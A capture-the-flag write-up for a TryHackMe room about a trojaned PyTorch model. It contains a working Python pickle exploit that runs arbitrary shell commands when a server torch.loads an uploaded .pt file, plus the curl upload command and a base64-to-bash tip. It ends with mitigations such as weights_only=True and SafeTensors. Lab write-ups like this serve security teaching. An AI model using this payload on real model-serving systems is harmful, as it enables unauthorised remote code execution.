# Cypheron — Trojaned Model / Neural C2 Beacon (TryHackMe)

- **Event:** 2026: An AI Odyssey CTF — Cypheron room, Task 1
- **Category:** AI Supply Chain Security · **Difficulty:** Insane · 120 pts
- **Completed:** 2026-10-08 · **Target:** <ip>
- **Flags:** `THM{…}` · `THM{…}` · `THM{…}`

Trojaned PyTorch model + a vendor-update endpoint that `torch.load`s uploads with
`weights_only=False` → **pickle deserialization RCE**. The supply-chain attack from the AI
Security path, made real.

## Recon

- `nmap -sT -Pn` (over VPN) → only **8000/tcp** open (gunicorn / Flask).
- `GET /` documents the API itself:
  - `POST /classify` — `{features: list[float] of length 16}` → class + probabilities.
  - `POST /vendor/push` — multipart, field `artifact` = `.pt`, **"loaded via torch.load …
    weights_only=False for backwards compatibility."** ← the hole.

## The exfil channel (no reverse shell)

A junk `.pt` → `{"error":"validation failed: invalid load key, 'n'."}`. The app does
`try: torch.load(...) except Exception as e: return {"error": f"validation failed: {e}"}` —
so it **echoes the pickle exception back to the client**. We make our payload *raise the
command output* as an exception → it comes back in the HTTP response. (Our Windows inbound is
firewalled, so a reverse/bind shell wouldn't work anyway — this channel is perfect.)

## Weaponised payload (stdlib pickle, no torch needed)

```python
import pickle, base64, sys
cmd = sys.argv[1] + " 2>&1 || true"
b64 = base64.b64encode(cmd.encode()).decode()
code = ("raise Exception(__import__('subprocess').check_output("
        "__import__('base64').b64decode('%s').decode(),shell=True)"
        ".decode('utf-8','replace'))" % b64)
class P:
    def __reduce__(self):            # fires during unpickling (torch.load)
        return (exec, (code,))
open(sys.argv[2], 'wb').write(pickle.dumps(P()))
```

Run commands via: `python exploit.py "<cmd>" x.pt` then
`curl -X POST http://IP:8000/vendor/push -F "artifact=@x.pt"` → output in the `error` field.
Tip: base64 the command (and pipe `… | base64 -d | bash`/`python3`) to dodge all shell quoting.
`torch.load` on a non-zip file falls back to legacy `pickle.load`, so a raw `pickle.dumps(P())`
executes before any magic-number/format check. RCE = `uid=1000(epoch)` in a Docker container.

## The three flags

1. **`THM{…}`** — `model_def.py` shows a hidden uint8 buffer
   `_calibration_constants` ("embedded vendor identifier"). Loaded the model *on the target*
   (it has torch) and decoded the buffer:
   ```python
   b = torch.load('/app/model/signal_classifier.pt', weights_only=False)
   bytes(bytearray(int(x) for x in b['state_dict']['_calibration_constants'].tolist()))
   # -> b'THM{…}'
   ```
2. **`THM{…}`** — `/etc/c2-hint.txt` ("flag (proof of execution)").
3. **`THM{…}`** — `/flag` (root-owned but world-readable; "the operator's prize").

Order per the hint-file narrative: analyze artifact (1) → proof of execution (2) → prize (3).
If a slot rejects, swap — all three are valid.

## Privesc notes (dead ends worth recording)

Whole container runs as `epoch` (PID 1 gunicorn = uid 1000, **no root processes**). No SUID
custom bins, no sudo, no docker socket, `CapEff=0` (unprivileged), only the model dir + a few
`/etc` files bind-mounted. So flag 3 was **not** a privesc/escape — just a world-readable
`/flag`. Don't over-engineer: `grep -rIaoE 'THM\{[^}]+\}' /` found the remaining flags directly.

## Lesson

`torch.load` (and any pickle-based model format) on untrusted input = **arbitrary code
execution**. Mitigation: `weights_only=True`, or **SafeTensors**, + validate/scan artifacts
(modelscan/fickling) before loading. Exactly the AI-supply-chain lesson from notes 13–15.
